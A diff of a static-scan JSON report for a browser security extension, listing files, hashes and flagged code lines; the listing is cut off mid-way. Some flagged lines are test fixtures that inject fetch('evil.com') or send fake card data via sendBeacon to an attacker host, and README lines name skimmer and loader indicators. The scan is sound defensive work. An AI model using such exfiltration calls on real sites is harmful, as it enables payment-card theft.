@@ -1,39 +1,129 @@
 {
   "probe": "probe09_static_scan",
-  "timestamp_utc": "2026-10-18T15:35:38.811558+00:00",
+  "timestamp_utc": "2026-11-18T09:08:46.180139+00:00",
   "python": "3.14.2",
-  "root": "C:\\Users\\Masterboard\\Downloads\\VGT-DomainGuard-Source-v0.1.0\\vgt-domainguard-src",
-  "file_count": 44,
+  "root": ".",
+  "file_count": 115,
   "inventory": [
     {
+      "path": ".gitattributes",
+      "size": 242,
+      "sha256": "de1ddc32566eb6a71cc636ec763b633639a1e2775a4e707bfcc0188a6157c816"
+    },
+    {
+      "path": ".github/ISSUE_TEMPLATE/bug_report.yml",
+      "size": 1966,
+      "sha256": "44845df32f625f3cd277576a6fbaac9223ddc9f5b00ed4f9d8349867fb1335f0"
+    },
+    {
+      "path": ".github/ISSUE_TEMPLATE/config.yml",
+      "size": 27,
+      "sha256": "13064e7bea658e01e718b414fbb7b3b244f36411fe25ee2055c151f7b534547a"
+    },
+    {
+      "path": ".github/ISSUE_TEMPLATE/false-positive-negative.yml",
+      "size": 2011,
+      "sha256": "5c01fd2afbc3a5594027efdb8003b7920ce5ea6afb35d0db99a8684f50e77eac"
+    },
+    {
+      "path": ".github/workflows/ci.yml",
+      "size": 2310,
+      "sha256": "ae0f06198d0a8d3ec552399e977fe3980598cd1a87ba72a74db153fafcd2aed4"
+    },
+    {
+      "path": ".github/workflows/release.yml",
+      "size": 1890,
+      "sha256": "100ad092152087fa49a88f942c19a941a6d1f5bae4e309a010c2cd9e927d5542"
+    },
+    {
+      "path": ".gitignore",
+      "size": 424,
+      "sha256": "ce6dbbf6e4b3a4acb3b851c6b257ce99e638257e0712f385b03a7d73920adbe7"
+    },
+    {
+      "path": "_locales/de/messages.json",
+      "size": 514,
+      "sha256": "f7ed93b9add7dd7ce4670b8bbfed913a5b3b646d0b4b8a7a633a621fcf52a570"
+    },
+    {
+      "path": "_locales/en/messages.json",
+      "size": 508,
+      "sha256": "7cf6b5ed4d0083b224a060217e8a43859bb8852ac7bc07464890256fe90aedb6"
+    },
+    {
+      "path": "_locales/ru/messages.json",
+      "size": 649,
+      "sha256": "481f7502fa057e7898bd4f2320037760f8300c36714593954bab6beb9132abd4"
+    },
+    {
+      "path": "_locales/zh_CN/messages.json",
+      "size": 507,
+      "sha256": "e03bb77b34a15848844660df3e2124838d4147e2f051ec3da256523bd33428e3"
+    },
+    {
+      "path": "ARCHITECTURE_AND_SECURITY_REVIEW.md",
+      "size": 7069,
+      "sha256": "137109c27a2747745fa8d5a2d76845c4603e95179a105ed2dbdd258b2005a179"
+    },
+    {
       "path": "build.py",
-      "size": 1925,
-      "sha256": "d96f55257f575d3114b50a623f2501a0ceb416a29a6b8e6df15254be7e084405"
+      "size": 6907,
+      "sha256": "a76fead0782ce73cddf7e131b78074e83e64e29d6c2d260fe5bd2db439f7bad1"
     },
     {
       "path": "build_sites.py",
-      "size": 6867,
-      "sha256": "88652ff44d27105105b71701d7f438e3bfe68bbf5296a23fde0fbaadc3eacdfb"
+      "size": 9992,
+      "sha256": "665ce525c416c727acda9407d26f46f99e76f7f99f93916cd67bf1fe91c5024b"
+    },
+    {
+      "path": "CHANGELOG.md",
+      "size": 13252,
+      "sha256": "858691fa7dc4168a843dcb4f4f662cfd28347c3fbcdfaf3d297de238130e7621"
+    },
+    {
+      "path": "chrome/_locales/de/messages.json",
+      "size": 514,
+      "sha256": "f7ed93b9add7dd7ce4670b8bbfed913a5b3b646d0b4b8a7a633a621fcf52a570"
+    },
+    {
+      "path": "chrome/_locales/en/messages.json",
+      "size": 508,
+      "sha256": "7cf6b5ed4d0083b224a060217e8a43859bb8852ac7bc07464890256fe90aedb6"
+    },
+    {
+      "path": "chrome/_locales/ru/messages.json",
+      "size": 649,
+      "sha256": "481f7502fa057e7898bd4f2320037760f8300c36714593954bab6beb9132abd4"
+    },
+    {
+      "path": "chrome/_locales/zh_CN/messages.json",
+      "size": 507,
+      "sha256": "e03bb77b34a15848844660df3e2124838d4147e2f051ec3da256523bd33428e3"
     },
     {
       "path": "chrome/background.js",
-      "size": 5171,
-      "sha256": "c3523551c18ac7564fc4631d38806ddcf9140956dbade3f32c0a39832d2e9653"
+      "size": 14016,
+      "sha256": "5f38878e2579342e5abda040b9a52d090669c824d0018be74581668162bf2b4d"
+    },
+    {
+      "path": "chrome/design-tokens.css",
+      "size": 7784,
+      "sha256": "52997e9126695574e01233f7fb49d25d0cce502e634756f2e14f318ac73325a5"
     },
     {
       "path": "chrome/guard.css",
-      "size": 7715,
-      "sha256": "2e45e75e9e1b20e9f531393bee1c05ddfa7c0b0775203ef7d9204044d86bff82"
+      "size": 5501,
+      "sha256": "2348f7d63e7de9a47041781903747aed0aa96a9e8ec85b6b8813a305e9c0f55f"
     },
     {
       "path": "chrome/guard.html",
-      "size": 4447,
-      "sha256": "2f77cf6504e3a079b40acb5320445fecb9fe1327596815a0634836763b9edc11"
+      "size": 4321,
+      "sha256": "7c8796f9a7fa598fca3c2a191464c7dee833bef5349d9c9643c78277d1f39313"
     },
     {
       "path": "chrome/guard.js",
-      "size": 3671,
-      "sha256": "f259d0434eb7190331273b9ebdc77271c13de65d1115ee72053770942bb090e8"
+      "size": 10454,
+      "sha256": "10fb063b3a1905d76aa7103210b4a24c683a5e5b33faf3c15717ff7bc0ee73af"
     },
     {
       "path": "chrome/icons/icon128.png",
@@ -52,48 +142,133 @@
     },
     {
       "path": "chrome/manifest.json",
-      "size": 1015,
-      "sha256": "f29a264849f341039491c294baecf0a8b2215ff58f0c254dd0c82574fda708bd"
+      "size": 1763,
+      "sha256": "970b3ed6d3c093f7eb2314522aaf9f565508a26bd9e26dff5cdb796353b4bdc9"
+    },
+    {
+      "path": "chrome/options.css",
+      "size": 10318,
+      "sha256": "a3e1de6e3ca83a880a629f3dab8c83a6cf012fa98483a509b5a95ab3fc90608b"
+    },
+    {
+      "path": "chrome/options.html",
+      "size": 22773,
+      "sha256": "f16849c70dc41cce66ebdf4ea56dc69789e67e1fe19b53986964fcdcf20ee1cd"
+    },
+    {
+      "path": "chrome/options.js",
+      "size": 27177,
+      "sha256": "1d576aff2e8cafec6c1166176fdf60a16a1d9e41e44001ad0a86dcab52dbdfa7"
+    },
+    {
+      "path": "chrome/popup.css",
+      "size": 9011,
+      "sha256": "33f06a50914d053b7f696458092a88d633f6906d89383ebd5e31f6c0e92c7319"
     },
     {
       "path": "chrome/popup.html",
-      "size": 8716,
-      "sha256": "06220ceb7c31208c3c2c9a27f29f29463ca1fefa6946687848ea4adfa8839446"
+      "size": 8371,
+      "sha256": "bfedb658dcc0157658fed2ac9b85ed2963bb0f622012faaebc9e4cf758cebccc"
     },
     {
       "path": "chrome/popup.js",
-      "size": 1952,
-      "sha256": "6b6e77ab79cc78c585c8ee6baa643d3727c383865a3cbffaec09414f4a22610b"
+      "size": 13384,
+      "sha256": "a7f9883a0389787d67e9cbf11a4aa7db7987c019f80802958631e96c1b7f564a"
+    },
+    {
+      "path": "chrome/rulesets/trackers.json",
+      "size": 5328,
+      "sha256": "fb7142af3be1f9360e03c38de1f1215c5486abef3b68a8907720a2cfff10f130"
+    },
+    {
+      "path": "chrome/shared/aegis-engine.js",
+      "size": 64153,
+      "sha256": "7853b637e303521633c4727e17db99452c55332e8a5560327b51b86348082f29"
     },
     {
       "path": "chrome/shared/detector.js",
-      "size": 12668,
-      "sha256": "41bf609836bb480af772413f3f775fe1c44b68a6a07670e3ee91b78ba597baf9"
+      "size": 47687,
+      "sha256": "0c4153800979a7bba08c4efb86a5e1709dcc372d29c2cd86459bf15256ada9ed"
+    },
+    {
+      "path": "chrome/shared/i18n.js",
+      "size": 50174,
+      "sha256": "2ec106b7c1958e1be16c5f84ab4dfb6abe6bd636263ea54b249186d7d5c26812"
+    },
+    {
+      "path": "chrome/shared/shield-content.js",
+      "size": 30509,
+      "sha256": "724a37ac1edc4a391e033e469d034d0957a6bd890e1d2cfc48e10c39ea74a862"
     },
     {
       "path": "chrome/shared/sites.js",
-      "size": 19460,
-      "sha256": "c814babb52790eebe7aaa665bf708ff5adfa90f8d6b0ee8a594b8892f8b9451d"
+      "size": 23505,
+      "sha256": "5d993720d19c846e8a44e91d755df3583b937481e8ee673db21e45ad8e3bd3db"
+    },
+    {
+      "path": "CONTRIBUTING.md",
+      "size": 1898,
+      "sha256": "3f2ea176b2bc534a893e9bdc05502d1cd5117d688e57b20159bd6795b1f5d765"
+    },
+    {
+      "path": "docs/ALPHA-INSTALL.md",
+      "size": 3212,
+      "sha256": "7bccb510a4abefbb6fe983188439f5590e6d319a9619fdad28b40465bb80be62"
+    },
+    {
+      "path": "docs/RELEASE-SIGNING.md",
+      "size": 4601,
+      "sha256": "55db6d3e835d3c6d8d0627a4e69786f3ca9f2c77c320cc79b6239117f8e17414"
+    },
+    {
+      "path": "docs/TESTING-ALPHA.md",
+      "size": 3343,
+      "sha256": "811f0c3a1290139a5eeb83badda6e092bc807c8eda6927cefe00be59a8adea2f"
+    },
+    {
+      "path": "firefox/_locales/de/messages.json",
+      "size": 514,
+      "sha256": "f7ed93b9add7dd7ce4670b8bbfed913a5b3b646d0b4b8a7a633a621fcf52a570"
+    },
+    {
+      "path": "firefox/_locales/en/messages.json",
+      "size": 508,
+      "sha256": "7cf6b5ed4d0083b224a060217e8a43859bb8852ac7bc07464890256fe90aedb6"
+    },
+    {
+      "path": "firefox/_locales/ru/messages.json",
+      "size": 649,
+      "sha256": "481f7502fa057e7898bd4f2320037760f8300c36714593954bab6beb9132abd4"
+    },
+    {
+      "path": "firefox/_locales/zh_CN/messages.json",
+      "size": 507,
+      "sha256": "e03bb77b34a15848844660df3e2124838d4147e2f051ec3da256523bd33428e3"
     },
     {
       "path": "firefox/background.js",
-      "size": 1591,
-      "sha256": "487efa13fea2916fb45726a0388c29ded7fc16c1086e25dd7279bd8edd488f87"
+      "size": 9321,
+      "sha256": "a2419f96c90d30235234312f2f95339a1206adcd385a33f7212c621af31d0cf7"
+    },
+    {
+      "path": "firefox/design-tokens.css",
+      "size": 7784,
+      "sha256": "52997e9126695574e01233f7fb49d25d0cce502e634756f2e14f318ac73325a5"
     },
     {
       "path": "firefox/guard.css",
-      "size": 7715,
-      "sha256": "2e45e75e9e1b20e9f531393bee1c05ddfa7c0b0775203ef7d9204044d86bff82"
+      "size": 5501,
+      "sha256": "2348f7d63e7de9a47041781903747aed0aa96a9e8ec85b6b8813a305e9c0f55f"
     },
     {
       "path": "firefox/guard.html",
-      "size": 4447,
-      "sha256": "2f77cf6504e3a079b40acb5320445fecb9fe1327596815a0634836763b9edc11"
+      "size": 4321,
+      "sha256": "7c8796f9a7fa598fca3c2a191464c7dee833bef5349d9c9643c78277d1f39313"
     },
     {
       "path": "firefox/guard.js",
-      "size": 3671,
-      "sha256": "f259d0434eb7190331273b9ebdc77271c13de65d1115ee72053770942bb090e8"
+      "size": 10454,
+      "sha256": "10fb063b3a1905d76aa7103210b4a24c683a5e5b33faf3c15717ff7bc0ee73af"
     },
     {
       "path": "firefox/icons/icon128.png",
@@ -112,28 +287,68 @@
     },
     {
       "path": "firefox/manifest.json",
-      "size": 972,
-      "sha256": "d9cafec3049214e67058f923ef6ead2e913bb8ce215867e9f11ec5a45c1bcd74"
+      "size": 1764,
+      "sha256": "61105fd6ab4bbec0b38cb829b39da55ab1a644e7c7a0d32e194cebfaacd6c599"
+    },
+    {
+      "path": "firefox/options.css",
+      "size": 10318,
+      "sha256": "a3e1de6e3ca83a880a629f3dab8c83a6cf012fa98483a509b5a95ab3fc90608b"
+    },
+    {
+      "path": "firefox/options.html",
+      "size": 22773,
+      "sha256": "f16849c70dc41cce66ebdf4ea56dc69789e67e1fe19b53986964fcdcf20ee1cd"
+    },
+    {
+      "path": "firefox/options.js",
+      "size": 27177,
+      "sha256": "1d576aff2e8cafec6c1166176fdf60a16a1d9e41e44001ad0a86dcab52dbdfa7"
+    },
+    {
+      "path": "firefox/popup.css",
+      "size": 9011,
+      "sha256": "33f06a50914d053b7f696458092a88d633f6906d89383ebd5e31f6c0e92c7319"
     },
     {
       "path": "firefox/popup.html",
-      "size": 8716,
-      "sha256": "06220ceb7c31208c3c2c9a27f29f29463ca1fefa6946687848ea4adfa8839446"
+      "size": 8371,
+      "sha256": "bfedb658dcc0157658fed2ac9b85ed2963bb0f622012faaebc9e4cf758cebccc"
     },
     {
       "path": "firefox/popup.js",
-      "size": 1952,
-      "sha256": "6b6e77ab79cc78c585c8ee6baa643d3727c383865a3cbffaec09414f4a22610b"
+      "size": 13384,
+      "sha256": "a7f9883a0389787d67e9cbf11a4aa7db7987c019f80802958631e96c1b7f564a"
+    },
+    {
+      "path": "firefox/rulesets/trackers.json",
+      "size": 5328,
+      "sha256": "fb7142af3be1f9360e03c38de1f1215c5486abef3b68a8907720a2cfff10f130"
+    },
+    {
+      "path": "firefox/shared/aegis-engine.js",
+      "size": 64153,
+      "sha256": "7853b637e303521633c4727e17db99452c55332e8a5560327b51b86348082f29"
     },
     {
       "path": "firefox/shared/detector.js",
-      "size": 12668,
-      "sha256": "41bf609836bb480af772413f3f775fe1c44b68a6a07670e3ee91b78ba597baf9"
+      "size": 47687,
+      "sha256": "0c4153800979a7bba08c4efb86a5e1709dcc372d29c2cd86459bf15256ada9ed"
+    },
+    {
+      "path": "firefox/shared/i18n.js",
+      "size": 50174,
+      "sha256": "2ec106b7c1958e1be16c5f84ab4dfb6abe6bd636263ea54b249186d7d5c26812"
+    },
+    {
+      "path": "firefox/shared/shield-content.js",
+      "size": 30509,
+      "sha256": "724a37ac1edc4a391e033e469d034d0957a6bd890e1d2cfc48e10c39ea74a862"
     },
     {
       "path": "firefox/shared/sites.js",
-      "size": 19460,
-      "sha256": "c814babb52790eebe7aaa665bf708ff5adfa90f8d6b0ee8a594b8892f8b9451d"
+      "size": 23505,
+      "sha256": "5d993720d19c846e8a44e91d755df3583b937481e8ee673db21e45ad8e3bd3db"
     },
     {
       "path": "icons/icon128.png",
@@ -156,64 +371,164 @@
       "sha256": "aeb232b45ff5002d448f5344f99d89c861ce2f93bb69fefaf9add60384b6b08a"
     },
     {
-      "path": "Next.md",
-      "size": 5079,
-      "sha256": "f852aa9db83089c86b7653550aafce2a1bbe444b5982e8b7f17e8e1d9104bcc9"
+      "path": "PRIVACY.md",
+      "size": 1912,
+      "sha256": "cda92d0717261ec7db8958f407eae30a04157cfae9d3baf6a43365f3288f9d4c"
+    },
+    {
+      "path": "README.de.md",
+      "size": 24153,
+      "sha256": "7bed9717c758bc8b9bef5ec1f59e8015e793125079f386aeff5c89fee659582c"
     },
     {
       "path": "README.md",
-      "size": 6695,
-      "sha256": "f954ac35696163de7fd3fd144b4df5ed518e4a9298f8294521f154c48271c6bf"
+      "size": 22855,
+      "sha256": "218577e9d7943253754289699baa0cc30b1435ccc482e2a37e680dbe4a186568"
+    },
+    {
+      "path": "README.ru.md",
+      "size": 32493,
+      "sha256": "489a7e105c69a7199c9fa80122cdf1283d3a1e99eb67b71804b4a9a8464d1db1"
+    },
+    {
+      "path": "README.zh.md",
+      "size": 21564,
+      "sha256": "bbd92741b3b64c17466ce4c02b0259b3c45719fd4eb0ff85e47d34ee9c06ef81"
+    },
+    {
+      "path": "rulesets/trackers.json",
+      "size": 5328,
+      "sha256": "fb7142af3be1f9360e03c38de1f1215c5486abef3b68a8907720a2cfff10f130"
+    },
+    {
+      "path": "sbom.json",
+      "size": 8287,
+      "sha256": "19dde6529e35a247f8998d60657c6c2fcdbca0f62e89a1c9167f3681c1964e15"
+    },
+    {
+      "path": "scripts/generate_screenshots.py",
+      "size": 10184,
+      "sha256": "a0b9f9a64146c6cd90da329c35bbe93dd4c695de536ca6a3de9257fc4373cc2d"
+    },
+    {
+      "path": "scripts/publish_github_releases.py",
+      "size": 10180,
+      "sha256": "1a6672c3aad498b23b5e27eba049b07e6f3258c64f54de3ebc8be5182cdf8612"
+    },
+    {
+      "path": "scripts/verify-release.ps1",
+      "size": 1751,
+      "sha256": "d67fc687a9983c9e5abc3546607a295d8a94617f62f60406781cfcd8ea9d44c9"
+    },
+    {
+      "path": "scripts/verify-release.sh",
+      "size": 604,
+      "sha256": "58c2bfe7d06c909bc9831452f7402da163cb51d4f2dafb0619af733c2007b8e8"
     },
     {
       "path": "SECURITY.md",
-      "size": 1185,
-      "sha256": "a05461d7083ccd7e94ff9ae1c442d97e451f83d6aedd3ab2364de5a7f548fc26"
+      "size": 6451,
+      "sha256": "a90db529f983594644e1347c3836af2c50480c4b05ed14bb351111dd23d27143"
+    },
+    {
+      "path": "SHA256SUMS.txt",
+      "size": 307,
+      "sha256": "d3b0ad86e3b230a60ba8c97d52dfe999ab37ca82a6809f1ee6fa7d9773c04db3"
+    },
+    {
+      "path": "shared/aegis-engine.js",
+      "size": 64153,
+      "sha256": "7853b637e303521633c4727e17db99452c55332e8a5560327b51b86348082f29"
+    },
+    {
+      "path": "shared/design-tokens.css",
+      "size": 7784,
+      "sha256": "52997e9126695574e01233f7fb49d25d0cce502e634756f2e14f318ac73325a5"
     },
     {
       "path": "shared/detector.js",
-      "size": 12668,
-      "sha256": "41bf609836bb480af772413f3f775fe1c44b68a6a07670e3ee91b78ba597baf9"
+      "size": 47687,
+      "sha256": "0c4153800979a7bba08c4efb86a5e1709dcc372d29c2cd86459bf15256ada9ed"
     },
     {
       "path": "shared/guard.css",
-      "size": 7715,
-      "sha256": "2e45e75e9e1b20e9f531393bee1c05ddfa7c0b0775203ef7d9204044d86bff82"
+      "size": 5501,
+      "sha256": "2348f7d63e7de9a47041781903747aed0aa96a9e8ec85b6b8813a305e9c0f55f"
     },
     {
       "path": "shared/guard.html",
-      "size": 4447,
-      "sha256": "2f77cf6504e3a079b40acb5320445fecb9fe1327596815a0634836763b9edc11"
+      "size": 4321,
+      "sha256": "7c8796f9a7fa598fca3c2a191464c7dee833bef5349d9c9643c78277d1f39313"
     },
     {
       "path": "shared/guard.js",
-      "size": 3671,
-      "sha256": "f259d0434eb7190331273b9ebdc77271c13de65d1115ee72053770942bb090e8"
+      "size": 10454,
+      "sha256": "10fb063b3a1905d76aa7103210b4a24c683a5e5b33faf3c15717ff7bc0ee73af"
+    },
+    {
+      "path": "shared/i18n.js",
+      "size": 50174,
+      "sha256": "2ec106b7c1958e1be16c5f84ab4dfb6abe6bd636263ea54b249186d7d5c26812"
+    },
+    {
+      "path": "shared/options.css",
+      "size": 10318,
+      "sha256": "a3e1de6e3ca83a880a629f3dab8c83a6cf012fa98483a509b5a95ab3fc90608b"
+    },
+    {
+      "path": "shared/options.html",
+      "size": 22773,
+      "sha256": "f16849c70dc41cce66ebdf4ea56dc69789e67e1fe19b53986964fcdcf20ee1cd"
+    },
+    {
+      "path": "shared/options.js",
+      "size": 27177,
+      "sha256": "1d576aff2e8cafec6c1166176fdf60a16a1d9e41e44001ad0a86dcab52dbdfa7"
+    },
+    {
+      "path": "shared/popup.css",
+      "size": 9011,
+      "sha256": "33f06a50914d053b7f696458092a88d633f6906d89383ebd5e31f6c0e92c7319"
     },
     {
       "path": "shared/popup.html",
-      "size": 8716,
-      "sha256": "06220ceb7c31208c3c2c9a27f29f29463ca1fefa6946687848ea4adfa8839446"
+      "size": 8371,
+      "sha256": "bfedb658dcc0157658fed2ac9b85ed2963bb0f622012faaebc9e4cf758cebccc"
     },
     {
       "path": "shared/popup.js",
-      "size": 1952,
-      "sha256": "6b6e77ab79cc78c585c8ee6baa643d3727c383865a3cbffaec09414f4a22610b"
+      "size": 13384,
+      "sha256": "a7f9883a0389787d67e9cbf11a4aa7db7987c019f80802958631e96c1b7f564a"
+    },
+    {
+      "path": "shared/shield-content.js",
+      "size": 30509,
+      "sha256": "724a37ac1edc4a391e033e469d034d0957a6bd890e1d2cfc48e10c39ea74a862"
     },
     {
       "path": "shared/sites.js",
-      "size": 19460,
-      "sha256": "c814babb52790eebe7aaa665bf708ff5adfa90f8d6b0ee8a594b8892f8b9451d"
+      "size": 23505,
+      "sha256": "5d993720d19c846e8a44e91d755df3583b937481e8ee673db21e45ad8e3bd3db"
     },
     {
       "path": "sites-100.json",
-      "size": 19368,
-      "sha256": "2296c7b1aa8f0265558774ded4b17535223a047fc75d88993ca4f7ff5e7989cd"
+      "size": 23413,
+      "sha256": "76a4d292b63b20ba5c761a2a81344da736f0021cd4e83b7d77cbcdec641968de"
+    },
+    {
+      "path": "tests/adblock-shield.test.cjs",
+      "size": 20414,
+      "sha256": "32ba6f5aa969742bedc63a1f441f5ced421a2710052fc394fc6bc1045f282f89"
+    },
+    {
+      "path": "tests/aegis-shield.test.cjs",
+      "size": 6775,
+      "sha256": "20ad7f85eb7487744759d00127c24d59752a8edbc36ce26c5effb82fab7db726"
     },
     {
       "path": "tests/chrome-worker.test.cjs",
-      "size": 3867,
-      "sha256": "cfd78f7fdfc9b74bdba071bde30c7ba357a613751bbd10b284d731632c83c938"
+      "size": 6836,
+      "sha256": "b343759a64f49651676751eec6f1b6cb0b8fda76d3574c9262c2bf4857e87170"
     },
     {
       "path": "tests/detector.test.cjs",
@@ -222,59 +537,1002 @@
     },
     {
       "path": "tests/firefox-worker.test.cjs",
-      "size": 1883,
-      "sha256": "f470aef248eaaa8c14b722ff9b4c94dbd4e935168ab636c1b7b1fb7d9be02844"
+      "size": 3401,
+      "sha256": "9420cd0352ee45cf3aaa1bf8c701cc1402610ebef5061dc9144fb66abf5f5b79"
+    },
+    {
+      "path": "tests/gedefense-light.test.cjs",
+      "size": 12302,
+      "sha256": "197e2b4132ba87d23cd308781c201dcdd7f336b8998e57ba853bb0a52bd736dd"
+    },
+    {
+      "path": "tests/i18n.test.cjs",
+      "size": 3809,
+      "sha256": "38a11c08ff6d4ae24379015a9c6f0eb0c4e00da810b17d59c978de4166566330"
+    },
+    {
+      "path": "tests/options-and-whitelist.test.cjs",
+      "size": 7011,
+      "sha256": "3773f448435a3f3947c5bde6292eea17d945522b14475b4ea24d269fcf300b5f"
+    },
+    {
+      "path": "tests/p0-regressions.test.cjs",
+      "size": 5629,
+      "sha256": "75ff37c9f9a98551b102038b558449b04b4cdfccdf56592feab198efa3e9668c"
+    },
+    {
+      "path": "tests/platin-security.test.cjs",
+      "size": 13129,
+      "sha256": "3054ff93379824222df8a09b17454471500fcd067d1684994245da817404ed79"
+    },
+    {
+      "path": "tests/shield-content.test.cjs",
+      "size": 6812,
+      "sha256": "25f64be84e846a415b11bda303d0e5eb2bc8cfad4bcae2c2275970d1fb3c13ab"
+    },
+    {
+      "path": "tests/tracker-shield.test.cjs",
+      "size": 6844,
+      "sha256": "505dcf552c509d58dcb9a60245687e534af1cd0754f090b827f6fae317d103bd"
+    },
+    {
+      "path": "tests/v2-scoring.test.cjs",
+      "size": 4192,
+      "sha256": "4f99d58d54e9c3cf4a1a1618e0efe6a258f2b3d7c905cee544de13076538c471"
     }
   ],
   "sink_hits": {
-    "network_fetch": [],
-    "eval_like": [],
-    "html_sinks": [],
+    "network_fetch": [
+      {
+        "file": "README.de.md",
+        "line": 54,
+        "code": "Am 16. November 2026 schleusten Angreifer über kompromittiertes `projectJS` bei Optimizely schädlichen JavaScript-Code auf 178 namhafte Webseiten (darunter GitLab, Salesforce, IKEA, Zoom, CNN, BBC und Ledger). Nachgelade"
+      },
+      {
+        "file": "README.de.md",
+        "line": 60,
+        "code": "| **3. Zahlungs-Skimming (`sendBeacon('/card.php')`)** | Telemetrie-`sendBeacon` blockiert, aber `fetch`-Exfiltration an Skimmer-Pfade nicht gesperrt | **Abgewehrt:** Anti-Magecart Guard blockiert sowohl `navigator.sendB"
+      },
+      {
+        "file": "README.md",
+        "line": 54,
+        "code": "On November 16, 2026, attackers compromised Optimizely's `projectJS` delivery to inject malicious JavaScript across 178 high-profile websites (including GitLab, Salesforce, IKEA, Zoom, CNN, BBC, and Ledger), loading `168"
+      },
+      {
+        "file": "README.md",
+        "line": 60,
+        "code": "| **3. Payment Skimming (`sendBeacon('/card.php')`)** | `sendBeacon` telemetry dropped for analytics, but `fetch` exfiltration to skimmer paths was not blocked | **Blocked:** Anti-Magecart Guard intercepts both `navigato"
+      },
+      {
+        "file": "README.ru.md",
+        "line": 51,
+        "code": "16 ноября 2026 года злоумышленники внедрили вредоносный JS через `projectJS` Optimizely на 178 крупных сайтах (GitLab, Salesforce, IKEA, Zoom, Ledger и др.), загружая `1688360.cc/track.js`, `webshell.lol`, `eval(atob(..."
+      },
+      {
+        "file": "README.zh.md",
+        "line": 51,
+        "code": "2026 年 11 月 16 日，攻击者通过被攻陷的 Optimizely `projectJS` 向 178 家知名网站（含 GitLab、Salesforce、IKEA、Zoom、Ledger 等）注入恶意 JS，加载 `1688360.cc/track.js`、`webshell.lol`、`eval(atob(...))`、Magecart 窃密脚本（`sendBeacon('/card.php')`）、钱包剪贴板劫持及 `.i"
+      },
+      {
+        "file": "tests/adblock-shield.test.cjs",
+        "line": 424,
+        "code": "const res = await fakeWindow.fetch('https://www.youtube.com/youtubei/v1/player?key=123');"
+      },
+      {
+        "file": "tests/gedefense-light.test.cjs",
+        "line": 164,
+        "code": "sendBeacon(url, data) {"
+      },
+      {
+        "file": "tests/gedefense-light.test.cjs",
+        "line": 234,
+        "code": "const dirtyInput = '<div>Safe</div><script>fetch(\"evil.com\")</script>';"
+      },
+      {
+        "file": "tests/gedefense-light.test.cjs",
+        "line": 294,
+        "code": "const res = fakeWindow.navigator.sendBeacon('https://1688360.cc/card.php', JSON.stringify({ cc: '4111222233334444', cvv: '123' }));"
+      },
+      {
+        "file": "tests/gedefense-light.test.cjs",
+        "line": 299,
+        "code": "fakeWindow.navigator.sendBeacon('https://example.com/api/keepalive', 'ok');"
+      },
+      {
+        "file": "tests/tracker-shield.test.cjs",
+        "line": 24,
+        "code": "sendBeacon(url, data) {"
+      },
+      {
+        "file": "tests/tracker-shield.test.cjs",
+        "line": 168,
+        "code": "const success = fakeWindow.navigator.sendBeacon('https://www.google-analytics.com/collect', 'v=1&tid=UA-1234');"
+      }
+    ],
+    "eval_like": [
+      {
+        "file": "CHANGELOG.md",
+        "line": 30,
+        "code": "- Neutralisiert inline verschleierte Loader-Payloads (`eval(atob(...))`, `window._k7`, `data-channel-code=\"02111110\"`), ohne legitime First-Party-Skripte oder Zahlungs-CDNs (Stripe, Adyen, PayPal) einzuschränken."
+      },
+      {
+        "file": "README.de.md",
+        "line": 42,
+        "code": "- **Cross-Origin `<script>` & `<iframe>` Gatekeeper:** Abfang auf DOM-Prototyp-Ebene (`setAttribute`, `HTMLScriptElement.src`, `HTMLIFrameElement.src`, `appendChild`, `insertBefore`) gegen C2-Loader, Hochrisiko-TLDs (`.i"
+      },
+      {
+        "file": "README.de.md",
+        "line": 54,
+        "code": "Am 16. November 2026 schleusten Angreifer über kompromittiertes `projectJS` bei Optimizely schädlichen JavaScript-Code auf 178 namhafte Webseiten (darunter GitLab, Salesforce, IKEA, Zoom, CNN, BBC und Ledger). Nachgelade"
+      },
+      {
+        "file": "README.de.md",
+        "line": 59,
+        "code": "| **2. Verschleierte Fallback-Loader (`eval(atob(...))`)** | `innerHTML` / `javascript:` entschärft, aber `window._k7` / `data-channel-code` Inline-C2-Loader nicht gezielt erkannt | **Entschärft:** Verschleierte Inline-C"
+      },
+      {
+        "file": "README.md",
+        "line": 42,
+        "code": "- Cross-Origin `<script>` & `<iframe>` Gatekeeper at DOM prototype level (`setAttribute`, `HTMLScriptElement.src`, `HTMLIFrameElement.src`, `appendChild`, `insertBefore`) blocking malicious C2 loaders, high-risk TLDs (`."
+      },
+      {
+        "file": "README.md",
+        "line": 54,
+        "code": "On November 16, 2026, attackers compromised Optimizely's `projectJS` delivery to inject malicious JavaScript across 178 high-profile websites (including GitLab, Salesforce, IKEA, Zoom, CNN, BBC, and Ledger), loading `168"
+      },
+      {
+        "file": "README.md",
+        "line": 59,
+        "code": "| **2. Obfuscated Fallback (`eval(atob(...))`)** | `innerHTML`/`javascript:` neutralized, but `window._k7` / `data-channel-code` inline C2 loaders were not specifically matched | **Neutralized:** Inline obfuscated C2 loa"
+      },
+      {
+        "file": "README.ru.md",
+        "line": 42,
+        "code": "- Перехват динамических инъекций `<script>` и `<iframe>` на уровне DOM-прототипов (`setAttribute`, `HTMLScriptElement.src`, `HTMLIFrameElement.src`, `appendChild`, `insertBefore`) против C2-загрузчиков, зон риска (`.icu`"
+      },
+      {
+        "file": "README.ru.md",
+        "line": 51,
+        "code": "16 ноября 2026 года злоумышленники внедрили вредоносный JS через `projectJS` Optimizely на 178 крупных сайтах (GitLab, Salesforce, IKEA, Zoom, Ledger и др.), загружая `1688360.cc/track.js`, `webshell.lol`, `eval(atob(..."
+      },
+      {
+        "file": "README.zh.md",
+        "line": 42,
+        "code": "- 在 DOM 原型层（`setAttribute`、`HTMLScriptElement.src`、`HTMLIFrameElement.src`、`appendChild`、`insertBefore`）拦截恶意跨域 `<script>`/`<iframe>` 注入（C2 加载器、`.icu`/`.lol` 等高危后缀、裸 IPv4 以及 `eval(atob(...))` / `window._k7` 载荷）。"
+      },
+      {
+        "file": "README.zh.md",
+        "line": 51,
+        "code": "2026 年 11 月 16 日，攻击者通过被攻陷的 Optimizely `projectJS` 向 178 家知名网站（含 GitLab、Salesforce、IKEA、Zoom、Ledger 等）注入恶意 JS，加载 `1688360.cc/track.js`、`webshell.lol`、`eval(atob(...))`、Magecart 窃密脚本（`sendBeacon('/card.php')`）、钱包剪贴板劫持及 `.i"
+      },
+      {
+        "file": "scripts/publish_github_releases.py",
+        "line": 145,
+        "code": "- **GeDefense Light Supply-Chain, Magecart & Crypto-Clipper Fortress:** Cross-origin `<script>`/`<iframe>` prototype gatekeeper (`1688360.cc`, `webshell.lol`, `.icu` exploit kits, `eval(atob(...))`), Anti-Magecart `sendB"
+      },
+      {
